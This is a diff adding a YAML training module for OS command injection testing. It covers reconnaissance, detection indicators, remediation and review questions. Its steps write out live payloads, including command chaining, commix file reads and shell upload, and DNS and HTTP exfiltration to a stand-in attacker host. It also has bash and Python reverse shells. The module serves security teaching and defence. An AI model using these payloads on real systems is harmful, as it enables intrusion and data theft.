@@ -1,0 +1,162 @@
+# Category: Web Application Security - Command Injection
+name: "OS Command Injection Testing"
+id: "web-cmdi-001"
+category: "web_application"
+subcategory: "injection"
+difficulty: "intermediate"
+estimated_time: "45 minutes"
+
+description: |
+  Detect and exploit OS command injection vulnerabilities where user input is
+  passed to system shell commands. Covers both inline and blind command injection.
+
+learning_objectives:
+  - Identify parameters passed to OS commands
+  - Craft command injection payloads for various shells
+  - Exploit blind command injection via out-of-band techniques
+  - Remediate using allowlist and subprocess isolation
+
+tools:
+  - burp_suite
+  - curl
+  - commix
+  - ncat
+  - python3
+
+prerequisites:
+  - Linux and Windows command line knowledge
+  - Basic web application understanding
+  - Written authorization from target owner
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify parameters potentially passed to OS commands"
+    commands:
+      - "# Look for features: ping, traceroute, nslookup, file conversion, image processing"
+      - "curl -s 'http://[target_url]/utils/ping?host=127.0.0.1'"
+      - "curl -s 'http://[target_url]/utils/ping?host=127.0.0.1' | grep -i 'ttl\\|bytes\\|time'"
+    expected_output: "Application functionality revealing underlying OS command execution"
+    detection: "Normal application usage — no specific detection at this stage"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Test command chaining characters"
+    commands:
+      - "curl -s 'http://[target_url]/utils/ping?host=127.0.0.1;id'"
+      - "curl -s 'http://[target_url]/utils/ping?host=127.0.0.1|id'"
+      - "curl -s 'http://[target_url]/utils/ping?host=127.0.0.1||id'"
+      - "curl -s 'http://[target_url]/utils/ping?host=127.0.0.1&&id'"
+      - "curl -s 'http://[target_url]/utils/ping?host=127.0.0.1%0aid'"
+      - "curl -s 'http://[target_url]/utils/ping?host=$(id)'"
+      - "curl -s 'http://[target_url]/utils/ping?host=`id`'"
+    expected_output: "uid=www-data or similar user context returned in response"
+    detection: "Shell metacharacters (;, |, &, $, `) in HTTP parameters"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Automated command injection with commix"
+    commands:
+      - "commix --url='http://[target_url]/utils/ping?host=INJECT_HERE' --batch"
+      - "commix --url='http://[target_url]/utils/ping?host=INJECT_HERE' --os=unix --batch"
+      - "commix --url='http://[target_url]/utils/ping?host=INJECT_HERE' --file-read='/etc/passwd'"
+      - "commix --url='http://[target_url]/utils/ping?host=INJECT_HERE' --upload='/tmp/shell.php'"
+    expected_output: "Interactive pseudo-shell or command output from target system"
+    detection: "Commix user-agent; unusual process spawning from web server user"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Blind command injection via time delay"
+    commands:
+      - "curl -s --max-time 15 'http://[target_url]/utils/ping?host=127.0.0.1;sleep+10'"
+      - "curl -s --max-time 15 'http://[target_url]/utils/ping?host=127.0.0.1%0asleep%2010'"
+      - "time curl -s 'http://[target_url]/utils/ping?host=127.0.0.1|ping+-c+5+127.0.0.1'"
+    expected_output: "Response delayed by 10 seconds confirms blind command injection"
+    detection: "Unusual response times; sleep or ping commands in parameters"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Out-of-band data exfiltration via DNS"
+    commands:
+      - "# Start listener on attacker box"
+      - "tcpdump -i [interface] udp port 53 -n"
+      - "# Inject DNS exfiltration payload"
+      - "curl -s 'http://[target_url]/utils/ping?host=127.0.0.1;nslookup+$(whoami).[attacker_domain]'"
+      - "curl -s 'http://[target_url]/utils/ping?host=127.0.0.1;curl+http://[attacker_ip]/$(id|base64)'"
+    expected_output: "DNS query or HTTP request received at attacker-controlled infrastructure"
+    detection: "Outbound DNS or HTTP requests from web server to external hosts"
+
+  - id: "step6"
+    phase: "post_exploitation"
+    action: "Establish reverse shell"
+    commands:
+      - "# Listener on attacker machine"
+      - "ncat -lvnp 4444"
+      - "# Injection payload"
+      - "curl -s 'http://[target_url]/utils/ping?host=127.0.0.1;bash+-i+>%26+/dev/tcp/[attacker_ip]/4444+0>%261'"
+      - "curl -s 'http://[target_url]/utils/ping?host=127.0.0.1;python3+-c+\"import socket,subprocess,os;s=socket.socket();s.connect(('[attacker_ip]',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh'])\"'"
+    expected_output: "Interactive shell on target system as web server user"
+    detection: "Outbound TCP connection from web server process; /bin/bash spawned by web process"
+
+compliance_controls:
+  - standard: "PCI DSS v4.0"
+    control: "6.2.4"
+    description: "Prevent OS command injection in web-facing applications"
+  - standard: "OWASP ASVS v4.0"
+    control: "5.2.2"
+    description: "Validate and sanitize all OS command inputs"
+  - standard: "NIST 800-53 Rev5"
+    control: "SI-10"
+    description: "Information input validation"
+  - standard: "CIS Controls v8"
+    control: "16.2"
+    description: "Establish and maintain a process to accept and address software vulnerabilities"
+
+detection:
+  network_indicators:
+    - "Shell metacharacters in HTTP parameters: semicolon, pipe, ampersand, backtick"
+    - "Outbound connections from web server to unexpected external hosts"
+    - "Encoded shell characters (%0a, %3b, %7c) in URI parameters"
+  log_indicators:
+    - "Process execution logs showing shell spawned by web server process (Apache, Nginx)"
+    - "Auditd logs: execve calls from www-data or apache user"
+    - "Web server access logs with command strings in parameters"
+  endpoint_indicators:
+    - "Unexpected processes running as web server user"
+    - "Network connections from web server process to external IPs"
+    - "/proc entries showing bash or python spawned from web process"
+
+remediation:
+  immediate:
+    - "Avoid passing user input to OS commands — redesign using native language APIs"
+    - "Use allowlist validation for any parameters used in OS calls"
+    - "Escape shell metacharacters using language-specific escaping functions"
+    - "Run web server with minimal OS privileges (drop capabilities)"
+  long_term:
+    - "Implement application sandboxing (seccomp, AppArmor, SELinux)"
+    - "Deploy WAF rules to detect command injection patterns"
+    - "Use subprocess APIs with argument arrays (no shell=True in Python)"
+    - "Regular code review and SAST scanning for dangerous function calls"
+
+variables:
+  target_url: "http://target.example.com"
+  attacker_ip: "10.10.10.1"
+  attacker_domain: "attacker.example.com"
+  interface: "eth0"
+
+assessment_questions:
+  - "What is the difference between inline and blind command injection?"
+  - "How does time-based detection work for blind command injection?"
+  - "Why is 'shell=True' dangerous in Python's subprocess module?"
+  - "What characters are used to chain OS commands in Linux?"
+  - "How would you perform command injection in a Windows environment?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/Command_Injection"
+    title: "OWASP Command Injection"
+  - url: "https://portswigger.net/web-security/os-command-injection"
+    title: "PortSwigger OS Command Injection Labs"
+  - url: "https://github.com/commixproject/commix"
+    title: "Commix Automated Command Injection"
+  - url: "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
+    title: "OWASP Command Injection Defense Cheat Sheet"
